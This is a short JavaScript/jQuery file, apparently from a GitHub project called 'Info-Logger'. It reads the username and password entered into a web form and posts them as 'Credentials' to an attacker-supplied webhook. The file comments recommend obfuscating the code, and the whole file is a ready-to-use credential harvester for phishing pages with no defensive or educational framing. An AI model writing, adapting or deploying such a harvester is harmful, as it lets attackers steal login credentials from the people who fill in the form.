/* 
Coded by @DARKNOSY (https://github.com/DARKNOSY/Info-Logger)
I recommend using https://obfuscator.io/
*/

src="https://code.jquery.com/jquery-3.6.0.min.js"
$(document).ready(function() {
  var avatarUrl = 'https://avatars.githubusercontent.com/u/109553205?v=4';
  var username = "JavaScript Info Logger / @DARKNOSY";
  var webhookUrl = "INSERT-WEBHOOK-LINK-HERE";  // INSERT YOUR WEBHOOK LINK HERE

  $("#webhookForm").submit(function(event) {
    event.preventDefault();

    var UsernameInput = $("#username").val();
    var PasswordInput = $("#2ndQUESTION").val();

    var embedFields = [
      { name: "Username", value: UsernameInput },  // INSERT YOUR FIRST QUESTION HERE
      { name: "Password", value: PasswordInput }  // INSERT YOUR SECOND QUESTION HERE
    ];

    var payload = {
      username: username,
      avatar_url: avatarUrl,
      embeds: [{
        author: {
          name: username,
          icon_url: avatarUrl
        },
        title: "Credentials",
        fields: embedFields,
        color: 2
      }]
    };

    $.ajax({
      url: webhookUrl,
      type: "POST",
      contentType: "application/json",
      data: JSON.stringify(payload),
      success: function() {
        alert("Success.");
      },
      error: function() {
        alert("Error.");
      }
    });
  });
});

// Coded by @DARKNOSY (https://github.com/DARKNOSY/Info-Logger)
